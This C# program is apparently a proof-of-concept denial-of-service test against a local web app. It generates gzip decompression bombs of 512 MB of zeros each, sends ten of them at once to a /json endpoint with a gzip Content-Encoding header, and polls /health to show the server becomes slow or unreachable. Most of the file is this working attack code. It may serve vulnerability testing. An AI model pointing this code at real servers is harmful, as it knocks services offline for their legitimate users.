using System.IO.Compression;
using System.Net.Http;
using System.Text.Json;

const string Base = "http://localhost:5099";
using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(120) };

Console.WriteLine("╔══════════════════════════════════════════════════════════╗");
Console.WriteLine("║  DoS Proof — Web App Inaccessibility During Attack       ║");
Console.WriteLine("╚══════════════════════════════════════════════════════════╝\n");

await PollHealth("PRE-ATTACK (baseline)");

// ══════════════════════════════════════════════════════════════════════════
// PHASE 1 — Baseline: measure normal response time with no attack
// ══════════════════════════════════════════════════════════════════════════
Console.WriteLine("\n╌╌╌ PHASE 1: BASELINE (no attack running) ╌╌╌");
{
    using var h = new HttpClient { Timeout = TimeSpan.FromSeconds(5) };
    var times = new List<long>();
    for (int i = 0; i < 5; i++)
    {
        var sw = System.Diagnostics.Stopwatch.StartNew();
        await h.GetAsync(Base + "/health");
        times.Add(sw.ElapsedMilliseconds);
        await Task.Delay(200);
    }
    Console.WriteLine($"  Avg response (no attack): {times.Average():F0} ms  Min: {times.Min()} ms  Max: {times.Max()} ms");
}

// ══════════════════════════════════════════════════════════════════════════
// PHASE 2 — Concurrent: attack fires, legitimate user polls simultaneously
// ══════════════════════════════════════════════════════════════════════════
Console.WriteLine("\n╌╌╌ PHASE 2: ATTACK RUNNING — simultaneous legitimate user requests ╌╌╌");

var cts = new CancellationTokenSource();

// Start user simulator in background
var userTask = UserSimulator.RunAsync(cts.Token);

// Brief pause so user gets a few clean readings first
await Task.Delay(600);

Console.WriteLine("\n  [ATTACK] Launching 10 × 512 MB decompression bombs concurrently...");
Console.WriteLine($"  [ATTACK] Network cost: 10 × 509.6 KB = ~5 MB sent");
Console.WriteLine($"  [ATTACK] Expected server memory load: 10 × 512 MB = 5+ GB\n");

byte[] bomb = MakeGzipBomb(512);

var attacks = Enumerable.Range(0, 10).Select(async i =>
{
    try
    {
        var sw2 = System.Diagnostics.Stopwatch.StartNew();
        var r = await PostCompressed("/json", bomb, "gzip", $"bomb-{i}");
        Console.WriteLine($"  [ATTACK] bomb-{i} done in {sw2.ElapsedMilliseconds} ms");
    }
    catch (Exception ex) { Console.WriteLine($"  [ATTACK] bomb-{i}: {ex.GetType().Name}"); }
});

await Task.WhenAll(attacks);

// Let user simulator run a bit longer after attack ends
await Task.Delay(2000);
cts.Cancel();
await userTask;

await PollHealth("POST-ATTACK");

Console.WriteLine("\n╔══════════════════════════════════════════════════════════╗");
Console.WriteLine("║  Above proves: during attack, /health (simple GET) is    ║");
Console.WriteLine("║  slow or unreachable → real users cannot use the app.    ║");
Console.WriteLine("╚══════════════════════════════════════════════════════════╝");

// ═══════════════════════════════ HELPERS ═════════════════════════════════════

static byte[] MakeGzipBomb(int decompressedMB, byte[]? payload = null)
{
    var ms = new MemoryStream();
    using (var gz = new GZipStream(ms, CompressionLevel.Optimal, leaveOpen: true))
    {
        if (payload != null)
        {
            gz.Write(payload, 0, payload.Length);
        }
        else
        {
            var chunk = new byte[65536]; // all zeros → ~1000:1 compression
            long total = (long)decompressedMB * 1024 * 1024;
            long written = 0;
            while (written < total)
            {
                int toWrite = (int)Math.Min(chunk.Length, total - written);
                gz.Write(chunk, 0, toWrite);
                written += toWrite;
            }
        }
    }
    return ms.ToArray();
}


async Task<string> PostCompressed(string path, byte[] body, string encoding, string label)
{
    var content = new ByteArrayContent(body);
    content.Headers.Remove("Content-Type");
    content.Headers.TryAddWithoutValidation("Content-Type", "application/octet-stream");
    content.Headers.TryAddWithoutValidation("Content-Encoding", encoding);

    var resp = await http.PostAsync(Base + path, content);
    return $"HTTP {(int)resp.StatusCode} — {await resp.Content.ReadAsStringAsync()}";
}

async Task PollHealth(string label)
{
    try
    {
        var j = await http.GetStringAsync(Base + "/health");
        using var doc = JsonDocument.Parse(j);
        var r = doc.RootElement;
        Console.WriteLine($"  [{label}] PID={r.GetProperty("pid").GetInt32()} " +
                          $"WorkingSet={r.GetProperty("working_set_mb").GetInt64()} MB " +
                          $"GC={r.GetProperty("gc_total_mb").GetInt64()} MB " +
                          $"status={r.GetProperty("status").GetString()}");
    }
    catch (Exception ex)
    {
        Console.WriteLine($"  [{label}] !! SERVER UNREACHABLE: {ex.Message}");
    }
}

void Print(string msg) => Console.WriteLine($"         → {msg}");
